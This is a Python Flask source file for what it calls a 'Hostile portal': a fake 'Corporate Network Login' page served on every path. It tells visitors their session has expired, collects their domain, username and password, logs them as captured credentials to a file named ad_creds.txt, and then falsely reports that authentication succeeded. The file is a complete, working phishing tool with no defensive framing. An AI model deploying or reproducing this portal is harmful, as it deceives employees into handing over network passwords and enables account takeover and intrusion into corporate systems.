from flask import Flask, request
import datetime
import os

app = Flask(__name__)

HTML_FORM = """<!DOCTYPE html>
<html>
<head><title>Corporate Network Login</title></head>
<body style="font-family:Arial;margin:80px auto;max-width:400px;text-align:center">
  <h2>Corporate Network</h2>
  <p style="color:red">Your session has expired. Please re-authenticate.</p>
  <form method="POST" action="/login" style="text-align:left">
    <label>Domain:</label><br>
    <input name="domain" value="CORP" style="width:100%;padding:8px;margin:5px 0"><br>
    <label>Username:</label><br>
    <input name="username" style="width:100%;padding:8px;margin:5px 0"><br>
    <label>Password:</label><br>
    <input name="password" type="password" style="width:100%;padding:8px;margin:5px 0"><br><br>
    <input type="submit" value="Login" style="width:100%;padding:10px;background:#0078d4;color:white;border:none">
  </form>
</body>
</html>"""


@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def catch_all(path):
    return HTML_FORM


@app.route("/login", methods=["POST"])
def login():
    entry = {
        "time":     str(datetime.datetime.now()),
        "ip":       request.remote_addr,
        "domain":   request.form.get("domain"),
        "username": request.form.get("username"),
        "password": request.form.get("password")
    }

    log_line = f"[{entry['time']}] {entry['domain']}\\{entry['username']}:{entry['password']} from {entry['ip']}"
    print(f"[!!!] CREDENTIALS CAPTURED: {log_line}")

    base_dir = os.path.dirname(os.path.abspath(__file__))
    with open(os.path.join(base_dir, "ad_creds.txt"), "a") as f:
        f.write(log_line + "\n")

    return "<h3 style='font-family:Arial;text-align:center;margin-top:100px'>Authentication successful. Redirecting...</h3>"


def start_portal():
    print("[*] Hostile portal running on http://0.0.0.0:80")
    print("[*] Captured credentials saved to ad_creds.txt")
    app.run(host="0.0.0.0", port=80)
